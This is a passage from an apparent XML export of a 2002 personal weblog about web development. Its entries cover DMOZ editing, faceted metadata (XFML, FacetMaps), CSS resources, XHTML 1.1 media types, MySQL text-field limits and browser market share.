&lt;blockquote cite=&quot;http://www.webcredibility.org/guidelines/index.html&quot;&gt;&lt;ol&gt;
&lt;li&gt;Make it easy to verify the accuracy of the information on your site.&lt;/li&gt;
&lt;li&gt;Show that there's a real organization behind your site.&lt;/li&gt;
&lt;li&gt;Highlight the expertise in your organization and in the content and services you provide.&lt;/li&gt;
&lt;li&gt;Show that honest and trustworthy people stand behind your site.&lt;/li&gt;
&lt;li&gt;Make it easy to contact you.&lt;/li&gt;
&lt;li&gt;Design your site so it looks professional (or is appropriate for your purpose).&lt;/li&gt;
&lt;li&gt;Make your site easy to use -- and useful.&lt;/li&gt;
&lt;li&gt;Update your site's content often (at least show it's been reviewed recently).&lt;/li&gt;
&lt;li&gt;Use restraint with any promotional content (e.g., ads, offers).&lt;/li&gt;
&lt;li&gt;Avoid errors of all types, no matter how small they seem.&lt;/li&gt;
&lt;/ol&gt;&lt;/blockquote&gt;</field>
		<field name="created">2002-07-27 22:54:56</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">253</field>
		<field name="title">DMOZ for Bath</field>
		<field name="slug">dmozForBath</field>
		<field name="body">&lt;p&gt;I've had my application for editorship of the &lt;acronym title=&quot;The Open Directory Project&quot;&gt;DMOZ&lt;/acronym&gt; &lt;a href=&quot;http://dmoz.org/Reference/Education/Colleges_and_Universities/Europe/United_Kingdom/England/University_of_Bath/&quot;&gt;University of Bath Category&lt;/a&gt; accepted. Bath's &lt;a href=&quot;http://www.bath.ac.uk/&quot;&gt;main site&lt;/a&gt; has notoriously bad navigation, so hopefully I'll be able to use DMOZ to build an alternative. I'm also looking in to eventually syndicating the DMOZ category via &lt;acronym title=&quot;Resource Description Framework&quot;&gt;RDF&lt;/acronym&gt; and replicating it elsewhere. Unfortunately it looks like you have to grab the whole &lt;a href=&quot;http://dmoz.org/rdf.html&quot; title=&quot;Open Directory RDF Dump&quot;&gt;130MB RDF file&lt;/a&gt; to do this, but I've seen tools that syndicate smaller portions of DMOZ so it must be possible to extract only the information you are interested in.&lt;/p&gt;</field>
		<field name="created">2002-07-27 23:02:05</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">254</field>
		<field name="title">Syndicating the ODP</field>
		<field name="slug">syndicatingTheOdp</field>
		<field name="body">&lt;p&gt;Having looked at &lt;a href=&quot;http://dmoz.org/Computers/Internet/Searching/Directories/Open_Directory_Project/Use_of_ODP_Data/Upload_Tools/&quot; title=&quot;Open Directory Project: Use of ODP Data: Upload Tools&quot;&gt;some of these tools&lt;/a&gt; for syndicating content from the &lt;acronym title=&quot;Open Directory Project&quot;&gt;ODP&lt;/acronym&gt;, it seems that the standard method is to grab and parse the actual &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt; files from the site rather than grabbing the huge &lt;acronym title=&quot;Resource Description Framework&quot;&gt;RDF&lt;/acronym&gt; files. This would be a lot easier if the pages of the site were valid &lt;acronym title=&quot;eXtensible HyperText Markup Language&quot;&gt;XHTML&lt;/acronym&gt;, but unfortunately they don't even have a DOCTYPE. Luckily I wrote a page-link parser the other day for something else which seems to do a pretty good job on the ODP, so I should be able to put together a decent script without too much trouble.&lt;/p&gt;</field>
		<field name="created">2002-07-27 23:24:15</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">255</field>
		<field name="title">Facets understood</field>
		<field name="slug">facetsUnderstood</field>
		<field name="body">&lt;p&gt;And suddenly I understand faceted metadata. Sometimes all you need for that final moment of insight is a good example, and Peter Van Djick's &lt;a href=&quot;http://poorbuthappy.com/colombia/topics.php&quot; title=&quot;List of topics on this website&quot;&gt;Columbia Guide Site Map&lt;/a&gt; is just what I needed. A facet is simply a &quot;flat&quot;, mutually exclusive (at least as far as the &lt;a href=&quot;http://www.xfml.org/spec/&quot;&gt;XFML specification&lt;/a&gt; is concerned) way of categorising a topic - it can be described as a bottom-up method of categorisation rather than the more common hierarchical top-down approach (as seen on the &lt;acronym title=&quot;Open Directory Project&quot;&gt;ODP&lt;/acronym&gt;) which seeks to assign all topics as sub-topics of something else. Peter writes in &lt;a href=&quot;http://www.xfml.org/#3&quot;&gt;XFML Background and Concepts&lt;/a&gt; that &lt;q cite=&quot;http://www.xfml.org/#3&quot;&gt;Faceted taxonomies are generally more powerful for websites than classic hierarchical taxonomies&lt;/q&gt; - this seems to make a great deal of sense, and it will be interesting to see this demonstrated by &lt;acronym title=&quot;eXtensible Faceted Metedata Language&quot;&gt;XFML&lt;/acronym&gt; in the near future.&lt;/p&gt;

&lt;p&gt;Update: Incidentally, IAWiki have an excellent page describing &lt;a href=&quot;http://www.iawiki.net/FacetedClassification&quot;&gt;FacetedClassification&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2002-07-28 11:40:57</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">256</field>
		<field name="title">The mind of God</field>
		<field name="slug">theMindOfGod</field>
		<field name="body">&lt;p&gt;Red Herring: &lt;a href=&quot;http://redherring.com/insider/2002/0716/bait071602.html&quot;&gt;Dinner with the mind behind the mind of God&lt;/a&gt;, an informal interview with Sergey Brin, cofounder of Google. The &quot;mind of God&quot; reference stems from this quote:&lt;/p&gt;&lt;blockquote cite=&quot;http://redherring.com/insider/2002/0716/bait071602.html&quot;&gt;&lt;p&gt;But in the end, the conversation returned to search. What would a perfect search engine look like? we asked. &quot;It would be the mind of God. Larry [Page] says it would know exactly what you want and give you back exactly what you need.&quot;&lt;/p&gt;&lt;/blockquote&gt;</field>
		<field name="created">2002-07-28 12:13:43</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">257</field>
		<field name="title">FacetMaps</field>
		<field name="slug">facetMaps</field>
		<field name="body">&lt;p&gt;Yet another interesting take on &lt;acronym title=&quot;eXtensible Markup Language&quot;&gt;XML&lt;/acronym&gt; metadata representations: &lt;a href=&quot;http://facetmap.com/&quot;&gt;FacetMaps&lt;/a&gt;. A facet map (as I understand it) is a way of combining facets with hierarchies, best explained by the excellent interactive &lt;a href=&quot;http://facetmap.com:8080/browse.jsp&quot;&gt;three minute concept intro&lt;/a&gt; on the site. One of the main contrasts to &lt;acronym title=&quot;XFML Faceted Metadata Language&quot;&gt;XFML&lt;/acronym&gt; is that in a Facet Map Facets, rather than Topics, are the principle categorisation element. A resource in a Facet Map is linked directly to one or more facets, rather than going through a topic. The XML format is pretty simple (a lot simpler than &lt;acronym title=&quot;XML Topic Maps&quot;&gt;XTM&lt;/acronym&gt; and &lt;acronym title=&quot;XFML Faceted Metadata Language&quot;&gt;XFML&lt;/acronym&gt;) so I might have a go at a &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; implementation at some point.&lt;/p&gt;</field>
		<field name="created">2002-07-28 12:57:24</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">258</field>
		<field name="title">Another free Python book</field>
		<field name="slug">anotherFreePythonBook</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.greenteapress.com/thinkpython.html&quot;&gt;How to Think Like a Computer Scientist: Learning with Python&lt;/a&gt; is a new Python text book covered by the &lt;a href=&quot;http://www.gnu.org/copyleft/fdl.html&quot;&gt;GNU Free Documentation License&lt;/a&gt; and &lt;a href=&quot;http://www.ibiblio.org/obp/thinkCSpy/&quot; title=&quot;Table of Contents&quot;&gt;available on the web&lt;/a&gt;. The thread &lt;a href=&quot;http://developers.slashdot.org/article.pl?sid=02/07/27/1131218&quot; title=&quot;Think Python&quot;&gt;discussing it&lt;/a&gt; on Slashdot gives mixed reviews, with other recommended free alternatives including Mark Pilgrim's &lt;a href=&quot;http://diveintopython.org/&quot;&gt;Dive Into Python&lt;/a&gt; and &lt;a href=&quot;http://www.mindview.net/Books/TIPython&quot;&gt;Thinking in Python&lt;/a&gt; by Bruce Eckel.&lt;/p&gt;</field>
		<field name="created">2002-07-28 13:10:06</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">259</field>
		<field name="title">XHTML ODP attribution</field>
		<field name="slug">xhtmlOdpAttribution</field>
		<field name="body">&lt;p&gt;The &lt;acronym title=&quot;Open Directory Project&quot;&gt;ODP&lt;/acronym&gt; require you to display &lt;a href=&quot;http://dmoz.org/become_an_editor/&quot;&gt;an attribution&lt;/a&gt; on any page that reuses &lt;acronym title=&quot;Open Directory Project&quot;&gt;ODP&lt;/acronym&gt; data. The recommended attribution fails to validate as &lt;acronym title=&quot;eXtensible HyperText Markup Language&quot;&gt;XHTML&lt;/acronym&gt;, so I created an &lt;acronym title=&quot;eXtensible HyperText Markup Language&quot;&gt;XHTML&lt;/acronym&gt; compliant &lt;a href=&quot;http://www.bath.ac.uk/~cs1spw/demos/dmoz-xhtml.html&quot; title=&quot;XHTML compliant DMOZ Banner&quot;&gt;alternative&lt;/a&gt; which looks visually identical (at least in standards compliant browsers) but uses &lt;code&gt;&amp;lt;div&amp;gt;&lt;/code&gt;s with &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; styles. ODP editor in chief &lt;a href=&quot;http://dmoz.org/profiles/rdkeating25.html&quot;&gt;rdkeating25&lt;/a&gt; has informally approved my alternative version on the ODP editor forums so I'm ready to go - at least as soon as I finish writing a script to parse data from their pages ;)&lt;/p&gt;</field>
		<field name="created">2002-07-28 15:19:29</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">260</field>
		<field name="title">Back to normal at diveintomark</field>
		<field name="slug">backToNormalAtDiveIntoMark</field>
		<field name="body">&lt;p&gt;Mark Pilgrim has made his &lt;a href=&quot;http://diveintomark.org/archives/2002/07/29.html#while_you_were_out&quot; title=&quot;While you were out&quot;&gt;first update&lt;/a&gt; since finishing his &lt;a href=&quot;http://diveintoaccessibility.org/&quot; title=&quot;Dive Into Accessibility&quot;&gt;accessibility series&lt;/a&gt; a week ago. He has launched a new site design (as previewed on &lt;a href=&quot;http://two.pairlist.net/mailman/listinfo/css-discuss&quot;&gt;css-discuss&lt;/a&gt;)   in an attractive shade of blue, and posted a catch up of the many events that took place over the weeks that his blog was devoted to accessibility. My favourite quote:&lt;/p&gt;&lt;blockquote&gt;&lt;p&gt;Netscape 4 turned 5. 5 years ago, my best friend wasn't even dating; now he's married and has two kids. Fucking upgrade already.&lt;/p&gt;&lt;/blockquote&gt;</field>
		<field name="created">2002-07-29 14:43:38</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">261</field>
		<field name="title">XHTML 1.1 Woes</field>
		<field name="slug">xhtml11woes</field>
		<field name="body">&lt;p&gt;Tim Luoma on &lt;a href=&quot;http://lists.evolt.org/&quot;&gt;thelist&lt;/a&gt; poined out &lt;a href=&quot;http://www.w3.org/TR/xhtml-media-types/#summary-table&quot; title=&quot;Media types summary for serving XHTML documents&quot;&gt;this table&lt;/a&gt;, which details the media types that can be used when serving &lt;acronym title=&quot;eXtensible HyperText Markup Language&quot;&gt;XHTML&lt;/acronym&gt; documents. The table shows that XHTML 1.1 &lt;strong&gt;should not&lt;/strong&gt; be served with a &lt;code&gt;text/html&lt;/code&gt; Content-Type header. Unfortunately using any of the allowed headers (&lt;code&gt;application/xhtml+xml&lt;/code&gt;, &lt;code&gt;application/xml&lt;/code&gt; or &lt;code&gt;text/xml&lt;/code&gt;) will cause Netscape 4 to pop up a &quot;download file&quot; dialog, and is likely to cause problems in other older browsers as well. Looks like I'll be sticking with XHTML 1.0 Strict for a good while to come. I don't really understand the hurry to move to XHTML 1.1 exhibited by some developers - to my mind, the single biggest advantage of XHTML is the fact that it allows documents to be parsed by any &lt;acronym title=&quot;eXtensible Markup Language&quot;&gt;XML&lt;/acronym&gt; parsing tool, and this benefit is available in XHTML 1.0.&lt;/p&gt;</field>
		<field name="created">2002-07-29 19:01:08</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">262</field>
		<field name="title">Funky stuff coming soon</field>
		<field name="slug">funkyStuffComingSoon</field>
		<field name="body">&lt;p&gt;Peter Van Dijck has unveiled the Secret Metadata Project (&lt;a href=&quot;http://poorbuthappy.com/ease/000324.html&quot; title=&quot;Work on the Secret Metadata Project has started...&quot;&gt;here&lt;/a&gt; and &lt;a href=&quot;http://poorbuthappy.com/ease/000325.html&quot; title=&quot;The whole metadata thing I&amp;apos;m working on...&quot;&gt;here&lt;/a&gt;), so I hguess it's time for me to come clean as well :) I'm working with him on a proof-of-concept &lt;acronym title=&quot;PHP: Hypertext Preprocesor&quot;&gt;PHP&lt;/acronym&gt; application for &lt;a href=&quot;http://www.xfml.org/&quot;&gt;XFML&lt;/a&gt;, his markup language for exchanging faceted metadata. So far I'm really enjoying the challenge - I get to play with XML &lt;em&gt;and&lt;/em&gt; collaborate on an exciting new project with an extremely talented information architect. The application is shaping up at an impressive rate, and we hope to have something live and doing things within a couple of weeks.&lt;/p&gt;</field>
		<field name="created">2002-07-30 02:33:16</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">263</field>
		<field name="title">Multi-lingual PHP</field>
		<field name="slug">multiLanguagePHP</field>
		<field name="body">&lt;p&gt;A &lt;a href=&quot;http://www.sitepointforums.com/showthread.php?postid=511866#post511866&quot; title=&quot;Multi-lingual web site&quot;&gt;thread on SitePoint&lt;/a&gt; got me thinking about how &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt;'s little known &lt;code&gt;parse_ini_file()&lt;/code&gt; function could be used to easily manage multiple language versions of web site messages. Sections could be set up for each supported language, with message definitions repeated in each section. You could even have a default message section at the top which is used when a message has not been defined for a particular language. The comments on the &lt;a href=&quot;http://www.php.net/parse_ini_file&quot;&gt;parse_ini_file manual page&lt;/a&gt; suggest that the function is not particularly suitable for large scale use - PHP exits if the ini file is malformed and it can't handle files larger than 16,382 bytes.  That said, rolling a more reliable native PHP version should be a trivial project.&lt;/p&gt;</field>
		<field name="created">2002-07-30 03:22:10</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">264</field>
		<field name="title">Tabs are not MDI</field>
		<field name="slug">tabsAreNotMDI</field>
		<field name="body">&lt;p&gt;Dave Hyatt &lt;a href=&quot;http://www.mozillazine.org/weblogs/hyatt/2002_07_21_mozillian_archive.html#85289235&quot; title=&quot; It&amp;apos;s all about the tabs&quot;&gt;explains why&lt;/a&gt; Mozilla's tabbed browsing is different to (and better than) Opera's &lt;acronym title=&quot;Multiple Document Interface&quot;&gt;MDI&lt;/acronym&gt; model:&lt;/p&gt;&lt;blockquote&gt;&lt;p&gt;Tabs are not a replacement for window management. They are an enhancement that can be used in conjunction with the window manager of your operating system to group thematically related content in separate windows. Different topics can be kept in different windows, and then within a window you can have any number of pages open that are all topically linked. This is much more powerful than MDI, as it isn't about replacing your window manager or keeping you inside a single browser window.&lt;/p&gt;&lt;/blockquote&gt;&lt;p&gt;Dave observes that Opera have added this dual-behaviour to Opera 6, following on from Mozilla's lead. On a related note, I am currently using a dual head graphics card with two monitors hooked up to my machine. This allows me to have a Mozilla instance (with tabs) running on both monitors at once. Lovely :)&lt;/p&gt;</field>
		<field name="created">2002-07-30 03:34:46</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">265</field>
		<field name="title">aqTree2</field>
		<field name="slug">aqTree2</field>
		<field name="body">&lt;p&gt;Stuart has updated &lt;a href=&quot;http://www.kryogenix.org/code/browser/aqtree2/&quot;&gt;aqTree&lt;/a&gt;, his excellent unordered-list-to-dynamic-tree script. The script is a clever piece of Javascript that uses the &lt;acronym title=&quot;Document Object Model&quot;&gt;DOM&lt;/acronym&gt; to turn a nested unordered list in to a Windows Explorer style tree, without needing to add any extra &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt; code. The new version is &lt;q&gt;rather nice and less crufty now&lt;/q&gt;.&lt;/p&gt;</field>
		<field name="created">2002-07-30 10:56:29</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">266</field>
		<field name="title">Reasons not to use Access</field>
		<field name="slug">reasonsNotToUseAccess</field>
		<field name="body">&lt;p&gt;I've never used &lt;acronym title=&quot;Microsoft&quot;&gt;MS&lt;/acronym&gt; Access for anything web related, and I certainly don't intend to at any point in the future. however, I do see a lot of questions regarding Access on various forums and mailing lists. &lt;a href=&quot;http://www.aspemporium.com/aspEmporium/tutorials/dontUseMSAccess.asp&quot;&gt;Nine Reasons NOT To Use MS Access To Power A DB-Driven Website&lt;/a&gt; (published 29th June 2002) is an excellent article explaining exactly why using Access on the web is a really bad idea.&lt;/p&gt;</field>
		<field name="created">2002-07-31 12:56:47</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">267</field>
		<field name="title">The CSS bug ring</field>
		<field name="slug">theCSSBugRing</field>
		<field name="body">&lt;p&gt;Killer &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; link: &lt;a href=&quot;http://users.rraz.net/mc_on_the_rocks/testpage/pie.html&quot;&gt;Position Is Everything&lt;/a&gt;, part of the CSS bug ring. Big John on &lt;a href=&quot;http://two.pairlist.net/mailman/listinfo/css-discuss&quot;&gt;CSS-Discuss&lt;/a&gt; is probably the single most helpful individual I have ever encountered on a mailing list - he explains the most complicated (and simple) of solutions quickly, comprehensibly and in easy to understand terms. Position Is Everything is his collection of common but complex &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; browser bugs, complete with full explanations and any effective workarounds. The site links in to the CSS bug ring, a small ring of five sites providing more of the same. Truly an indespensable resource for anyone with an interest in &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt;.&lt;/p&gt;</field>
		<field name="created">2002-07-31 21:07:53</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">268</field>
		<field name="title">My shortest entry ever</field>
		<field name="slug">myShortestEntryEver</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.wizkidsgames.com/mwdarkage/mw_article.asp?cid=36984&quot; title=&quot;The Making of a BattleMech&quot;&gt;Wow&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2002-07-31 23:40:03</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">269</field>
		<field name="title">Students and the web</field>
		<field name="slug">studentsAndTheWeb</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.washingtonpost.com/wp-dyn/articles/A9729-2002Jul15.html&quot;&gt;Point. Click. Think?&lt;/a&gt; (via &lt;a href=&quot;http://www.dellah.com/orient/2002/07/31/research_on_the_web.shtml&quot; title=&quot;Research on the web&quot;&gt;from the orient&lt;/a&gt;). This is an interesting, well written piece on the effect that the web is having on student learning and research habits. Looking back at my first year at Uni I am probably a text book example of the symptoms the article describes - I hardly ventured in to the library at all, getting most of my additional course information from the web. Then again a Computer Science degree is probably better suited to web research than many other courses.&lt;/p&gt;</field>
		<field name="created">2002-07-31 23:55:04</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">270</field>
		<field name="title">CSS selectors tutorial</field>
		<field name="slug">cssSelectorsTutorial</field>
		<field name="body">&lt;p&gt;Since it took me a while to find this page today, here is it for future reference. &lt;a href=&quot;http://www.westciv.com.au/style_master/academy/css_tutorial/selectors/&quot;&gt;Westciv's  Guide to CSS Selectors&lt;/a&gt; is an excellent explanation of selectors, a key element of CSS. A good understanding selectors makes styling any part of a document possible with less code and more flexibility.&lt;/p&gt;</field>
		<field name="created">2002-08-01 11:09:17</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">271</field>
		<field name="title">Styles of blogging</field>
		<field name="slug">stylesOfBlogging</field>
		<field name="body">&lt;p&gt;There's a great discussion going on at &lt;a href=&quot;http://weblog.delacour.net/&quot;&gt;the heart of things&lt;/a&gt; concerning &lt;a href=&quot;http://weblog.delacour.net/archives/000615.html&quot; title=&quot;Polishing and perfecting&quot;&gt;different styles of blogging&lt;/a&gt; and the way the format is evolving. The range of formats evident across the blogosphere fascinates me - there are as many different styles as there are blogs, and each blogger's style is constantly evolving. Personally I want to move towards more of a unique-content-generation model (as opposed to my current link farm) but at the same time my experiments with meta data mean that the more &quot;shallow&quot; content I have the more chance I will get to do interesting things with relationships between entries.&lt;/p&gt;</field>
		<field name="created">2002-08-01 11:35:52</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">272</field>
		<field name="title">MySQL text limits</field>
		<field name="slug">mysqlTextLimits</field>
		<field name="body">&lt;p&gt;Today's scary discovery: MySQL TEXT fields have a limit of 65,000 bytes. If you insert anything larger than that in to a normal TEXT field mySQL will silently truncate your data without telling you (meaning software checks are probably a good idea). MEDIUMTEXT will store 16 million characters and LONGTEXT can handle over 4 trillion, but this information does not appear to be readily available in the online mySQL manual (although it is hinted at in &lt;a href=&quot;http://www.mysql.com/documentation/mysql/bychapter/manual_Reference.html#Storage_requirements&quot; title=&quot;Column Type Storage Requirements&quot;&gt;this table&lt;/a&gt;). Something to bare in mind when designing database applications.&lt;/p&gt;</field>
		<field name="created">2002-08-01 12:24:16</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">273</field>
		<field name="title">LUMS in CSS</field>
		<field name="slug">lumsInCSS</field>
		<field name="body">&lt;p&gt;I've been messing around with &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; today, trying to convert &lt;a href=&quot;http://www.lums.lancs.ac.uk/pages/Executive/&quot;&gt;this page&lt;/a&gt; to use standards compliant &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; and &lt;acronym title=&quot;eXtensible HyperText Markup Language&quot;&gt;XHTML&lt;/acronym&gt; while keeping the overall look and feel. My efforts so far can be seen &lt;a href=&quot;http://development.incutio.com/lums/&quot;&gt;here&lt;/a&gt; - I've knocked the &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt; file size down from 27KB to 7KB (although that doesn't take the new external &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; file in to account) and it seems to work in Opera, Mozilla and &lt;acronym title=&quot;Internet Explorer&quot;&gt;IE&lt;/acronym&gt; on Windows. There is a slight issue at 800x600 (the breadcrumbs dissapear) and it looks terminally boring in Netscape 4 but on the whole it's come out pretty well.&lt;/p&gt;</field>
		<field name="created">2002-08-01 18:02:31</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">274</field>
		<field name="title">Ooooooooooh</field>
		<field name="slug">ooooooooooh</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://placenamehere.com/&quot;&gt;placenamehere.com&lt;/a&gt;: &lt;q cite=&quot;http://placenamehere.com/&quot;&gt;Chris Casciano's Digital Playground&lt;/q&gt;. I love this design - Chris uses beautiful black and white photos for page backgrounds and carefully positions the main navigational element on each page to fit in with the background image. This is a great example of the new design techniques being made possible by a combination of &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; and creative talent. I just wish I had some of the latter :)&lt;/p&gt;</field>
		<field name="created">2002-08-01 18:43:32</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">275</field>
		<field name="title">I know I'm bloody well subscribed</field>
		<field name="slug">iKnowImBloodyWellSubscribed</field>
		<field name="body">&lt;p&gt;It's the first day of the month. I don't believe in &lt;a href=&quot;http://www.harrumph.com/rabbit/&quot;&gt;rabbits&lt;/a&gt;, but I do believe in &lt;a href=&quot;http://www.list.org/&quot;&gt;Mailman&lt;/a&gt; - I just had my fourth &quot;monthly reminder&quot; email of the day. It beats me why the lists I am subscribed to see fit to email me once a month to remind me of my description - you would have thought the dozens of emails I get from them every day would be enough of a hint. In my opinion this is one default option the web could do without.&lt;/p&gt;</field>
		<field name="created">2002-08-01 19:13:30</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">276</field>
		<field name="title">CETIS</field>
		<field name="slug">cetis</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.cetis.ac.uk/&quot;&gt;CETIS&lt;/a&gt; is the Centre for Education Technology Interoperability Standards. Their site is regularly updated and contains a wealth of information about a whole range of interesting technologies, including metadata standards and plenty of stuff on web services and &lt;acronym title=&quot;eXtensible Markup Language&quot;&gt;XML&lt;/acronym&gt;. It also acts as an interesting insight in to technology plans within the UK's academic community.&lt;/p&gt;</field>
		<field name="created">2002-08-01 19:59:12</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">277</field>
		<field name="title">Real World Style</field>
		<field name="slug">realWorldStyle</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://realworldstyle.com&quot;&gt;Real World Style&lt;/a&gt;: &lt;q cite=&quot;http://realworldstyle.com/&quot;&gt;These techniques work. I know, because I use them every day in my real world job.&lt;/q&gt; Mark Newhouse provides a whole site dedicated to &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; tips, tricks and full blown public domain layouts specifically designed to work with Netscape 4 (and Unix machines). This is an invaluable resource for web developers who want to start using modern techniques but still have to cater for an audience with troublesome browser preferences.&lt;/p&gt;</field>
		<field name="created">2002-08-01 21:14:24</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">278</field>
		<field name="title">Don't expect to hear much from me for a while</field>
		<field name="slug">dontExpectToHearMuchFromMeForA</field>
		<field name="body">&lt;p&gt;My &lt;a href=&quot;http://www.bath.ac.uk/~cs1spw/blog/archive/2002/07/22/#cssBooksGalore&quot; title=&quot;CSS Books&quot;&gt;Amazon order&lt;/a&gt; has arrived.&lt;/p&gt;</field>
		<field name="created">2002-08-02 09:37:51</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">279</field>
		<field name="title">Using CVS</field>
		<field name="slug">usingCVS</field>
		<field name="body">&lt;p&gt;Harry Fuecks on SitePoint: &lt;a href=&quot;http://www.webmasterbase.com/article/831&quot;&gt;Harness the Power of CVS for Your Site&lt;/a&gt;. I've been wanting to get in to &lt;acronym title=&quot;Concurrent Versioning System&quot;&gt;CVS&lt;/acronym&gt; for quite a while but I've been put off by the lack of a good &quot;getting started&quot; guide. Harry's tutorial is everything I've been looking for - it explains concepts and terminology, describes when you would want to use &lt;acronym title=&quot;Concurrent Versioning System&quot;&gt;CVS&lt;/acronym&gt; and shows exactly how to use it on a Windows machine.&lt;/p&gt;</field>
		<field name="created">2002-08-02 12:33:05</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">280</field>
		<field name="title">W3C recommendations explained</field>
		<field name="slug">w3RecommendationsExplained</field>
		<field name="body">&lt;p&gt;Confused about the difference between &lt;acronym title=&quot;The World Wide Web Consortium&quot;&gt;W3C&lt;/acronym&gt; Notes, Working Drafts, Candidate Recommendations, Public Recommendations and normal Recommendations? So was I, until I found this handy &lt;a href=&quot;http://www.w3.org/TR/#About&quot; title=&quot;About W3C Technical Reports&quot;&gt;list of definitions&lt;/a&gt; on the official site.&lt;/p&gt;</field>
		<field name="created">2002-08-02 13:14:48</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">281</field>
		<field name="title">Ooh a mystery...</field>
		<field name="slug">oohAMystery</field>
		<field name="body">&lt;p&gt;I hate to be mysterious, but I have two &lt;em&gt;very&lt;/em&gt; exciting projects in the pipe line. I don't even know yet if they will make it to production, but if they do they could be very cool indeed.&lt;/p&gt;</field>
		<field name="created">2002-08-02 19:46:23</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">282</field>
		<field name="title">The Register and browser share</field>
		<field name="slug">theRegisterAndBrowserShare</field>
		<field name="body">&lt;p&gt;The Register: &lt;q cite=&quot;http://www.theregister.co.uk/content/6/26497.html&quot;&gt;approximately 25 per cent of readers access our site using non-Microsoft browsers&lt;/q&gt; (mentioned in passing in an &lt;a href=&quot;http://www.theregister.co.uk/content/6/26497.html&quot; title=&quot;Play the Alexa game&quot;&gt;article on Alexa&lt;/a&gt;). Now for some pure speculation. I can't imagine that this percentage was nearly as impressive 6 to 8 months ago, simply because 6 to 8 months ago there weren't really that many serious alternatives to IE - Mozilla was still in beta and most of the other Gecko engine browsers were still pretty shakey. With Mozilla past 1.0 and some great Gecko browsers being built on top of it (Chimera at al) IE is no longer necessarily the best choice. I just wish I had access to some 'real' statistics to further understand the ways in which the browser market is changing.&lt;/p&gt;</field>
		<field name="created">2002-08-03 10:27:44</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">283</field>
		<field name="title">Working on some cool new stuff</field>
		<field name="slug">workingOnSomeCoolNewStuff</field>
		<field name="body">&lt;p&gt;Slow blogging day today - I've been hit by a round of &lt;a href=&quot;http://www.dellah.com/orient/2002/08/01/comments_xmlitised.shtml&quot; title=&quot;from the orient:  Comments XMLitised&quot;&gt;Aquarionics Syndrome&lt;/a&gt; ;)&lt;/p&gt;</field>
		<field name="created">2002-08-03 20:11:17</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">284</field>
		<field name="title">First impressions</field>
		<field name="slug">firstImpressions</field>
